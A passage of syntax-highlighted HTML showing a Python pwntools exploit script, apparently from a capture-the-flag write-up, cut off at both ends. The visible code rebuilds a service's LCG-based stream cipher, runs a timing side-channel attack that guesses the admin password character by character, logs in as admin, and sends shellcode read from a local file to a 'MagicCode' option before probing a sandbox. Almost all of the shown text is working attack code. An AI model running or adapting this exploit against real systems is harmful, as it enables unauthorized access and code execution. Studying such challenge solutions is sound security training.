style="color:#4D9375">        if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> res</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#B8A965"> RuntimeError</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Failed to recover lane </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        last </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> lanes</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">]</span><span style="color:#5eaab5">[</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">        current </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE"> last </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> res</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><br><span style="color:#DBD7CAEE">        params</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">{</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> res</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> res</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">X</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> current</span><span style="color:#4d9375">}</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    cipher </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ToyPRNG</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">params</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    cipher</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">idx </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">limit </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 8</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> %</span><span style="color:#4C9A91"> 4</span><br><span style="color:#4D9375">    if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">keystream</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> %</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        cipher</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_keystream_block</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> cipher</span><br><br><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><span style="color:#758575DD"># Core interactions</span><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> build_io</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sys</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">argv</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676"> and</span><span style="color:#DBD7CAEE"> sys</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">remote</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C99076">HOST</span><span style="color:#666666">,</span><span style="color:#C99076"> PORT</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#C99076">BINARY</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> timing_attack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tube</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> cipher</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> charset</span><span style="color:#CB7676">=</span><span style="color:#4D9375">None</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max_len</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">64</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> charset </span><span style="color:#CB7676">is</span><span style="color:#4D9375"> None</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        charset </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> string</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ascii_letters </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> string</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">digits </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> "</span><span style="color:#C99076">{}</span><span style="color:#C98A7D">_!@#$%^&#x26;*()-_=+</span><span style="color:#C98A7D77">"</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> send_enc</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cipher</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encrypt</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">label</span><span style="color:#CB7676">=</span><span style="color:#C98A7D77">""</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        line </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#B8A965"> EOFError</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Disconnected while reading </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">label</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        ct </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">fromhex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">strip</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pt </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> cipher</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decrypt</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ct</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">debug</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">label</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">pt</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> pt</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> login_once</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> username</span><span style="color:#CB7676">=</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">admin</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">username prompt</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">username</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">password prompt</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">login result</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> parse_ms</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">resp</span><span style="color:#666666">:</span><span style="color:#B8A965"> bytes</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        m </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> re</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">rb</span><span style="color:#C98A7D77">"</span><span style="color:#C4704F">Login failed </span><span style="color:#E6CC77">\(</span><span style="color:#666666">(</span><span style="color:#B8A965">\d</span><span style="color:#4C9A91">+</span><span style="color:#666666">)</span><span style="color:#C4704F"> ms</span><span style="color:#E6CC77">\)</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">m</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">group</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> m </span><span style="color:#4D9375">else</span><span style="color:#4D9375"> None</span><br><br><span style="color:#DBD7CAEE">    known </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span><br><span style="color:#4D9375">    while</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">known</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> max_len</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        best_ch</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> best_ms </span><span style="color:#666666">=</span><span style="color:#4D9375"> None</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> charset</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            guess </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">known </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> ch</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            resp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> login_once</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">guess</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">startswith</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Welcome, admin!</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                return</span><span style="color:#DBD7CAEE"> known </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> ch</span><br><br><span style="color:#DBD7CAEE">            ms </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> parse_ms</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">resp</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> ms </span><span style="color:#CB7676">is</span><span style="color:#4D9375"> None</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">warning</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Timing parse failed for </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ch</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">resp</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                continue</span><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> ms </span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> best_ms</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                best_ms</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> best_ch </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ms</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ch</span><br><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> best_ch </span><span style="color:#CB7676">is</span><span style="color:#4D9375"> None</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#B8A965"> RuntimeError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Timing attack stalled (no candidate improved timing)</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> best_ms </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> and</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> known</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#B8A965"> RuntimeError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">All candidates leaked 0 ms; check username/charset.</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">        known </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> best_ch</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Progress: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">known</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> (delay </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">best_ms</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> ms)"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">    raise</span><span style="color:#B8A965"> RuntimeError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Password length exceeded without success</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> pwn_target</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    tube </span><span style="color:#666666">=</span><span style="color:#4D9375"> None</span><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] Starting exploit thread"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        tube </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        cipher </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> recover_cipher</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tube</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] Keystream/LCG recovered and cipher synced."</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">        password </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> timing_attack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tube</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> cipher</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] Recovered password: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">password</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">        # Final login to ensure admin session</span><br><span style="color:#CB7676">        def</span><span style="color:#80A665"> send_enc</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cipher</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encrypt</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">        def</span><span style="color:#80A665"> recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">label</span><span style="color:#CB7676">=</span><span style="color:#C98A7D77">""</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            line </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                raise</span><span style="color:#B8A965"> EOFError</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Disconnected while reading </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">label</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            pt </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> cipher</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decrypt</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">fromhex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">strip</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">debug</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">label</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">pt</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            return</span><span style="color:#DBD7CAEE"> pt</span><br><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">username prompt (final)</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">admin</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">password prompt (final)</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        resp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">login result (final)</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] Login response: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">resp</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">3</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">MagicCode prompt</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        with</span><span style="color:#B8A965"> open</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./myshellcode</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">rb</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            orw </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">orw</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        resp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">MagicCode response</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] MagicCode response: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">resp</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        send_enc</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        resp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> recv_plain</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">sandbox</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">        def</span><span style="color:#80A665"> parse_hex_response</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">line</span><span style="color:#666666">:</span><span style="color:#B8A965"> str</span><span style="color:#5eaab5">)</span><span style="color:#666666"> -</span><span style="color:#666666">></span><span style="color:#B8A965"> str</span><span style="color:#666666">:</span><br><span style="color:#758575DD">            # 抽取 hex 部分（只要连续 hex 字符即可）</span><br><span style="color:#DBD7CAEE">            m </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> re</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">r</span><span style="color:#C98A7D77">'</span><span style="color:#666666">(</span><span 